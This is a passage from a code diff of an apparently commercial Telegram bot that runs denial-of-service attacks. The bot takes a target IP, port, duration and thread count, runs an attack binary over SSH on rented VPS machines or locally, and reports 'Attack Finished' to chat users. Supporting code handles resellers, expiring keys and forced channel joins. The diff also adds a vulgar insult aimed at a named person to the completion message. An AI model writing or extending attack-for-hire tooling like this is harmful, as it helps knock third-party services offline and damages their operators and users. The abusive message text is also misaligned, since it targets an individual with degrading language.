-                    await asyncio.sleep(1)
-                
-                ssh.close()
-            except Exception as e:
-                logging.error(f"Error executing attack on VPS {selected_vps[0]}: {str(e)}")
-                raise
-        else:
-            # Fallback to local execution if no VPS
-            process = await asyncio.create_subprocess_shell(
-                f"{BINARY_PATH} {ip} {port} {duration} {threads}",
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            await process.communicate()
-
-        if attack_id in running_attacks:
-            del running_attacks[attack_id]
-
-        # Check if all attacks are finished
-        if not running_attacks:
             current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
             
-            # Edit original attack message to show completion
-            try:
-                await context.bot.edit_message_text(
-                    chat_id=update.effective_chat.id,
-                    message_id=context.user_data['attack_msg_id'],
-                    text=f"✅ *Attack Finished!*\n"
-                        f"🎯 *Target*: {ip}:{port}\n"
-                        f"🕒 *Duration*: {duration} sec\n"
-                        f"🧵 *Threads*: {threads}\n"
-                        f"👑 *Bot Owner:* {current_display_name}\n\n"
-                        f"🔥 *Attack completed successfully on all VPS!*",
-                    parse_mode='Markdown'
-                )
-            except Exception as e:
-                logging.error(f"Error editing message: {e}")
-                # If message can't be edited, send new one
-                await update.message.reply_text(
-                    f"✅ *Attack Finished!*\n"
-                    f"🎯 *Target*: {ip}:{port}\n"
-                    f"🕒 *Duration*: {duration} sec\n"
-                    f"🧵 *Threads*: {threads}\n"
-                    f"👑 *Bot Owner:* {current_display_name}\n\n"
-                    f"🔥 *Attack completed successfully on all VPS!*",
-                    parse_mode='Markdown'
-                )
+            await update.message.reply_text(
+                f"✅ *Attack Finished!*\n"
+                f"🎯 *Target*: {ip}:{port}\n"
+                f"🕒 *Duration*: {duration} sec\n"
+                f"🧵 *Threads*: {threads}\n"
+                f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
+                f"👑 *Bot Owner:* {current_display_name}\n\n"
+                f"🔥 *RITIK KI MUMMY CHODNA AB BND HO GY HA.*",
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logging.error(f"Error in attack execution: {str(e)}")
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
             
-    except Exception as e:
-        logging.error(f"Error in attack execution on {vps_ip}: {str(e)}")
-        if attack_id in running_attacks:
-            del running_attacks[attack_id]
-        
-        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
-        
-        await update.message.reply_text(
-            f"❌ *Attack Failed on {vps_ip}!*\n"
-            f"🎯 *Target*: {ip}:{port}\n"
-            f"🌐 *VPS Used*: `{vps_ip}`\n"
-            f"👑 *Bot Owner:* {current_display_name}\n\n"
-            f"💥 *Error*: {str(e)}",
-            parse_mode='Markdown'
-        )
-    asyncio.create_task(run_attack(ip, port, duration, threads, vps_ip, attack_id, update))
+            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+            
+            await update.message.reply_text(
+                f"❌ *Attack Failed!*\n"
+                f"🎯 *Target*: {ip}:{port}\n"
+                f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
+                f"👑 *Bot Owner:* {current_display_name}\n\n"
+                f"💥 *Error*: {str(e)}",
+                parse_mode='Markdown'
+            )
+
+    asyncio.create_task(run_attack())
     return ConversationHandler.END
 
 async def set_cooldown_start(update: Update, context: CallbackContext):
@@ -3295,8 +3127,6 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await show_users(update, context)    
     elif query == 'Add VPS':
         await add_vps_start(update, context)
-    elif query == 'Function':
-        await function_menu(update, context)    
     elif query == 'Remove VPS':
         await remove_vps_start(update, context)
     elif query == 'Upload Binary':
@@ -3311,7 +3141,7 @@ async def handle_button_click(update: Update, context: CallbackContext):
         await reset_vps(update, context)
     elif query == '⏳ Uptime':
         await show_uptime(update, context)
-    elif query == 'Owner Settings':
+    elif query == '⚙️ Owner Settings':
         await owner_settings(update, context)
     elif query == 'Add Bot':
         await add_bot_instance(update, context)
@@ -3507,14 +3337,6 @@ def main():
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
-    
-    select_vps_handler = ConversationHandler(
-    entry_points=[MessageHandler(filters.Text("Select VPS"), select_vps_start)],
-    states={
-        SELECT_VPS: [MessageHandler(filters.TEXT & ~filters.COMMAND, select_vps_input)],
-    },
-    fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
 
     # Add co-owner handlers
     add_co_owner_handler = ConversationHandler(
@@ -3556,15 +3378,6 @@ def main():
         entry_points=[MessageHandler(filters.Text("Add Group ID"), add_group_id_start)],
         states={
             ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_id_input)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
-    
-    change_force_channel_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Text("Change Force Channel"), change_force_channel_start)],
-        states={
-            GET_GROUP_FOR_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_group_for_force_channel)],
-            GET_FORCE_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_force_channel_input)],
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
@@ -3680,21 +3493,6 @@ def main():
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
-    # Add this with other conversation handlers
-    function_menu_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Text("Function"), function_menu)],
-        states={
-            MENU_SELECTION: [
-                MessageHandler(filters.Text("Add Group ID"), add_group_id_start),
-                MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start),
-                MessageHandler(filters.Text("RE Status"), reseller_status_start),
-                MessageHandler(filters.Text("Add VPS"), add_vps_start),
-                MessageHandler(filters.Text("Set Display Name"), set_display_name_start),
-                MessageHandler(filters.Text("Back to Home"), back_to_home),
-            ],
-        },
-        fallbacks=[CommandHandler("cancel", cancel_conversation)],
-    )
 
     
 
@@ -3718,7 +3516,6 @@ def main():
     application.add_handler(add_co_owner_handler)
     application.add_handler(CommandHandler("users", show_users))
     application.add_handler(MessageHandler(filters.Text("📜 View Logs"), view_logs))
-    application.add_handler(change_force_channel_handler)
     application.add_handler(remove_co_owner_handler)
     application.add_handler(display_name_handler)
     application.add_handler(reseller_status_handler)
@@ -3733,13 +3530,6 @@ def main():
     application.add_handler(broadcast_handler)
     application.add_handler(stop_bot_handler)
     application.add_handler(delete_binary_handler)
-    application.add_handler(select_vps_handler)
-    application.add_handler(function_menu_handler)
-    application.add_handler(MessageHandler(filters.Text("Back to Owner"), back_to_owner))
-    application.add_handler(MessageHandler(filters.Text("Service Menu"), service_menu))
-    application.add_handler(MessageHandler(filters.Text("VPS Settings"), vps_settings))
-    application.add_handler(MessageHandler(filters.Text("Bot Settings"), bot_settings))
-    application.add_handler(MessageHandler(filters.Text("Back to Owner"), back_to_owner))
     application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("forceon", force_join_on))
@@ -3756,9 +3546,9 @@ def main():
     # Add job queue to check expired keys
     job_queue = application.job_queue
     job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
+
     application.run_polling()
 
 if __name__ == '__main__':
     main()
-
 
